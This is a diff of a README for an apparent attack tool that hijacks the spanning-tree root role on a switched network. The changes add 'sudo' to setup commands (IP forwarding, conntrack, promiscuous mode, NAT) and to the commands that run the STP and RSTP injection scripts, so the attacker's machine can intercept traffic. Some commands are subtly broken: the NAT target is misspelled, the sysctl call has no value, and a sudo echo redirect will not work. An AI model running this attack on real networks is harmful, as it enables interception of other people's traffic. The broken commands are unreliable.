@@ -25,30 +25,30 @@ sudo pip3 install -r requirements.txt
 ### 3.1 Enable Forwarding
 
 ```
-sysctl -w net.ipv4.ip_forward
+sudo sysctl -w net.ipv4.ip_forward
 ```
 ### 3.2 Enable Conntrack (nf_conntrack_helper)
 ```
-modprobe nf_conntrack
-echo "1" > /proc/sys/net/netfilter/nf_conntrack_helper
+sudo modprobe nf_conntrack
+sudo echo "1" > /proc/sys/net/netfilter/nf_conntrack_helper
 ```
 ### 3.3 Promisc mode on interface
 ```
-ifconfig ethX promisc
+sudo ifconfig ethX promisc
 ```
 ### 3.4 NAT
 ```
-iptables -t nat -A POSTROUTING -o ethX -j MASQUEADE
+sudo iptables -t nat -A POSTROUTING -o ethX -j MASQUEADE
 ```
 
 ### 3.5 Start of injection.
 #### 3.5.1 STP
 ```
-python3 stpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX
+sudo python3 stpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX **(XX:XX:XX:XX:XX:XX - your MAC...)**
 ```
 #### 3.5.2 RSTP
 ```
-python3 rstpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX
+python3 rstpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX **(XX:XX:XX:XX:XX:XX - your MAC...)**
 ```
 After executing the injection, you will intercept the role of the root switch. you can track generated STP ads in Wireshark or tcpdump :)
 
